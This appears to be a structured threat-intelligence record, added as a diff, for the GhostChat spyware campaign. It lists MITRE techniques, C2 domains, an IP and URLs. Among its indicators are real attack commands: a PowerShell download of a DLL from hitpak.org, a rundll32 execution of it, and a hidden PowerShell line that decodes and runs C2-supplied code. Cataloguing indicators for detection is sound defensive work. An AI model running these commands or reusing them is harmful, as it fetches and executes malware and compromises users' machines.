@@ -1,0 +1,217 @@
+{
+  "malware_family": "GhostChat",
+  "threat_actor": "",
+  "platforms": [
+    "android",
+    "windows"
+  ],
+  "summary": "GhostChat is an Android spyware targeting users in Pakistan, disguised as a dating app. The campaign uses a romance scam with hardcoded credentials and is linked to a broader operation involving a Windows DLL for remote code execution and a WhatsApp account hijacking scheme.",
+  "mitre_techniques": [
+    "T1398",
+    "T1541",
+    "T1426",
+    "T1533",
+    "T1636.003",
+    "T1437.001",
+    "T1646",
+    "T1059.001",
+    "T1082",
+    "T1033",
+    "T1071.001",
+    "T1132.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "other",
+      "value": "com.datingbatch.chatapp",
+      "context": "GhostChat Android app package name",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Live Chat.apk",
+      "context": "Android GhostChat spyware APK filename",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "chat",
+      "context": "Hardcoded login username for GhostChat app",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "12345",
+      "context": "Hardcoded login password for GhostChat app",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\notepad2.dll",
+      "context": "Dropped DLL from batch script",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command \"Invoke-WebRequest -Uri 'https://hitpak.org/notepad2.dll' -OutFile '%TEMP%\\notepad2.dll'\"",
+      "context": "Batch script command to download DLL payload",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "rundll32.exe \"%TEMP%\\notepad2.dll\",notepad",
+      "context": "Batch script command to execute downloaded DLL payload",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "notepad",
+      "context": "Export function called by rundll32.exe",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "file.dll",
+      "context": "Windows payload from ClickFix attack",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "UnUsr",
+      "context": "Placeholder for unknown username in C2 beacon",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "UPC",
+      "context": "Placeholder for unknown computer name in C2 beacon",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<data_from_C&C>')) | Invoke-Expression\"",
+      "context": "Windows agent executes base64-encoded C2 commands",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "hitpak.org",
+      "context": "Distribution and C&C server",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "buildthenations.info",
+      "context": "Lure domain for ClickFix and WhatsApp attack",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "188.114.96.10",
+      "context": "Distribution and C&C server",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://hitpak.org/notepad2.dll",
+      "context": "Batch script download URL for DLL",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://foxy580.github.io/koko/file.dll",
+      "context": "ClickFix payload URL",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://buildthenations.info/PKCERT/pkcert.html",
+      "context": "Fake PKCERT ClickFix lure page",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://hitpak.org/page.php?tynor=<ComputerName>sss<Username>",
+      "context": "C2 beacon URL format for Windows DLL",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/page.php?tynor=",
+      "context": "C2 beacon path and parameter for Windows DLL",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "apk",
+    "pe",
+    "script"
+  ]
+}
